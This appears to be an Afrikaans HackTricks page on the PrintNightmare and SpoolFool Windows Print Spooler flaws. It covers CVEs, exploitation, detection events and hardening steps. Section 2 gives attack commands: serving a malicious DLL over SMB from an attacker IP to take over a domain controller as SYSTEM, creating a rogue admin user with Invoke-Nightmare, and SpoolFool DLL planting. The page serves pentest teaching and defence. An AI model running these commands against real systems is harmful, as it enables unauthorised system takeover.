# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare is die versamelnaam vir ’n groep kwesbaarhede in die Windows-diens **Print Spooler** wat **willekeurige kode-uitvoering as SYSTEM** moontlik maak en, wanneer die spooler oor RPC bereikbaar is, **afgeleë kode-uitvoering (RCE) op domeinbeheerders en lêerbedieners**. Die CVE’s wat die meeste uitgebuit is, is **CVE-2021-1675** (aanvanklik as LPE geklassifiseer) en **CVE-2021-34527** (volledige RCE). Latere probleme soos **CVE-2021-34481 (“Point & Print”)** en **CVE-2022-21999 (“SpoolFool”)** bewys dat die aanvaloppervlak nog lank nie gesluit is nie.

As jy op soek is na **authentication coercion / relay** via die spooler eerder as **driver-based RCE/LPE**, kyk na [hierdie ander bladsy oor printer coercion abuse](printers-spooler-service-abuse.md). Hierdie bladsy fokus op **die laai van drivers / DLLs as SYSTEM**.

---

## 1. Kwesbare komponente en CVE’s

| Jaar | CVE | Kort naam | Primitive | Notas |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|In die Junie 2021 CU reggemaak, maar deur CVE-2021-34527 omseil|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` laat geverifieerde gebruikers toe om ’n driver-DLL vanaf ’n afgeleë share te laai; ná Augustus 2021 vereis dit gewoonlik verswakte Point & Print-beleide|
|2021|CVE-2021-34481|“Point & Print”|LPE|Ongesignatureerde driver-installasie deur nie-admin-gebruikers|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Willekeurige gidskepping → DLL-planting – werk ná die 2021-regstellings|

Hulle maak almal misbruik van een van die **MS-RPRN / MS-PAR RPC-metodes** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) of vertrouensverhoudings binne **Point & Print**.

## 2. Uitbuitingstegnieke

### 2.1 Kompromittering van ’n afgeleë domeinbeheerder (CVE-2021-34527)

’n Geverifieerde maar **nie-bevoorregte** domeingebruiker kan willekeurige DLLs as **NT AUTHORITY\SYSTEM** op ’n afgeleë spooler (dikwels die DC) uitvoer deur:

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

Gewilde PoCs sluit **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) en Benjamin Delpy se `misc::printnightmare / lsa::addsid`-modules in **mimikatz** in.

### 2.2 Plaaslike privilege escalation (enige ondersteunde Windows, 2021-2024)

Dieselfde API kan **plaaslik** aangeroep word om ’n driver vanaf `C:\Windows\System32\spool\drivers\x64\3\` te laai en SYSTEM-regte te verkry:

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 Moderne triage op patched hosts

Op ’n volledig opgedateerde host misluk openbare PrintNightmare-PoCs dikwels omdat Windows nou standaard drukkerdrywers slegs deur administrateurs laat installeer (`RestrictDriverInstallationToAdministrators=1` sedert 10 Augustus 2021). Voordat jy ’n exploit op ’n teiken probeer, kyk eers of die omgewing daardie veiligheidsverandering teruggedraai het vir legacy-drukkerontplooiings:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

Die twee interessantste swak waardes is gewoonlik:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Bevestig vanaf Linux vinnig dat die teiken die relevante print RPC-koppelvlakke blootstel voordat jy ’n PoC uitvoer:

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

Sommige nuwer openbare hulpmiddels bied jou ook ’n veiliger **check/list**-werkvloei voordat jy ’n DLL stuur:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> As jy `RPC_E_ACCESS_DENIED` (`0x8001011b`) as ’n gebruiker met lae voorregte kry, sien jy gewoonlik die verstekinstelling ná 2021 eerder as ’n vervoerfout.

> Op Windows 11 22H2+ en nuwer kliëntbouwe gebruik afstanddrukwerk standaard **RPC oor TCP**, en **RPC oor named pipes** (`\PIPE\spoolss`) is gedeaktiveer tensy dit uitdruklik heraktiveer word. Sommige ouer PoC’s en laboratoriumnotas neem steeds aan dat die named pipe bereikbaar is.<sup>[[4]](#references)</sup>

### 2.4 Misbruik van Package Point & Print op “patched” netwerke

Baie ondernemingsomgewings het ná die oorspronklike patches van 2021 **volgens beleid kwesbaar** gebly omdat hulptoonbank- of drukbedienerwerkvloeie steeds vereis het dat nie-admin-gebruikers drywers installeer/opdateer. In die praktyk word die offensiewe speelboek:

- As sekuriteitsaanwysings heeltemal gedeaktiveer is, is **klassieke arbitrêre-DLL PrintNightmare** steeds die kortste pad.
- As `Only use Package Point and Print` geaktiveer is, moet jy gewoonlik na ’n **ondertekende pakketbewuste drywer**-pad oorskakel eerder as om ’n rou DLL neer te sit.<sup>[[3]](#references)</sup>
- Navorsing in 2024 het getoon dat **`Package Point and Print - Approved servers` nie op sigself ’n harde vertrouensgrens is nie**: as ’n aanvaller naamresolusie vir een goedgekeurde drukbediener kan bedrieg of kaap, kan slagoffers steeds na ’n kwaadwillige bediener herlei word wat aan die beleidskontroles voldoen.<sup>[[4]](#references)</sup>
- Selfs die kombinasie van UNC-hardening met afgedwonge RPC oor SMB kan broos wees omdat moderne kliënte moontlik **terugval na RPC oor TCP**.<sup>[[4]](#references)</sup>

Dit is waarom moderne PrintNightmare-agtige uitbuiting dikwels meer gaan oor **die misbruik van ondernemingsdrukkerontplooiingsbeleid** as om die oorspronklike PoC van 2021 onveranderd weer te speel.

### 2.5 SpoolFool (CVE-2022-21999) – om oplossings van 2021 te omseil

Microsoft se patches van 2021 het die laai van afgeleë drywers geblokkeer, maar **het nie gidsregte versterk nie**. SpoolFool misbruik die `SpoolDirectory`-parameter om ’n arbitrêre gids onder `C:\Windows\System32\spool\drivers\` te skep, ’n loonvrag-DLL daar neer te sit en die spooler te dwing om dit te laai:<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> Die exploit werk op volledig gepatchte Windows 7 → Windows 11 en Server 2012R2 → 2022 voordat die Februarie 2022-opdaterings geïnstalleer is<sup>[[2]](#references)</sup>

---

## 3. Opsporing en jag

* **PrintService-logboeke** – aktiveer die *Microsoft-Windows-PrintService/Operational*-kanaal en let op **Event ID 316** (drywer bygevoeg/bygewerk; sluit gewoonlik die DLL-name in) tydens beide suksesvolle en mislukte pogings. Koppel dit aan **Event ID 808/811** vir verdagte spooler-module-/drywerlaaifoute.
* **Sysmon** – `Event ID 7` (beeld gelaai) of `11/23` (lêer geskryf/geskrap) binne `C:\Windows\System32\spool\drivers\*` wanneer die ouerproses **spoolsv.exe** is.
* **Prosesafstamming** – maak ’n waarskuwing wanneer **spoolsv.exe** `cmd.exe`, `rundll32.exe`, PowerShell of enige onverwagte, ongetekende kinderproses laat begin.
* **Netwerktelemetrie** – onverwagte SMB-ophalings deur `spoolsv.exe` vanaf aanvallerbeheerde shares, of ongewone drukker-RPC-verkeer vanaf bedieners wat nie as print servers behoort op te tree nie, is albei sterk leidrade.

## 4. Versagting en verharding

1. **Dateer op!** – Installeer die jongste kumulatiewe opdatering op elke Windows-gasheer waarop die Print Spooler-diens geïnstalleer is.
2. **Deaktiveer die spooler waar dit nie nodig is nie**, veral op Domain Controllers:
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **Blokkeer afgeleë verbindings** terwyl plaaslike drukwerk steeds toegelaat word – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Hou Point & Print beperk tot administrateurs** deur die volgende in te stel:
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Gedetailleerde leiding in Microsoft KB5005652<sup>[[1]](#references)</sup>
5. As besigheidsvereistes `RestrictDriverInstallationToAdministrators=0` afdwing, behandel elke ander drukkerbeleid as **slegs ’n gedeeltelike versagting**. Verkies ten minste **pakketbewuste drywers**, aktiveer **Only use Package Point and Print**, en beperk **Package Point and Print - Approved servers** tot uitdruklike in-bos-drukbedieners.<sup>[[3]](#references)</sup>
6. **Moenie die privaatheid van drukker-RPC terugrol** net om stukkende drukkerkarterings reg te stel nie. Omgewings wat `RpcAuthnLevelPrivacyEnabled=0` stel, maak die verharding wat vir **CVE-2021-1678** bygevoeg is ongedaan en verdien gewoonlik ekstra aandag tydens ’n engagement.<sup>[[4]](#references)</sup>

---

## 5. Verwante navorsing / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules)-modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standaard Impacket-implementering met `-check`-, `-list`- en `-delete`-modusse
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper met ingeboude SMB-aflewering, ondersteuning vir verskeie teikens, en beide `MS-RPRN`- / `MS-PAR`-modusse
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – misbruik van jou eie kwesbare drukkerdrywer via package Point & Print
* SpoolFool-exploit en -skrywe
* 0patch-mikropleisters vir SpoolFool en ander spooler-foute

As jy **verifikasie wil afdwing** via die spooler in plaas daarvan om ’n drywer te laai, gaan na [misbruik van die drukker-spoolerdiens](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Bestuur nuwe verstekgedrag vir Point & Print-drywerinstallasie](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – ’n Praktiese gids tot PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare is nog nie verby nie](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
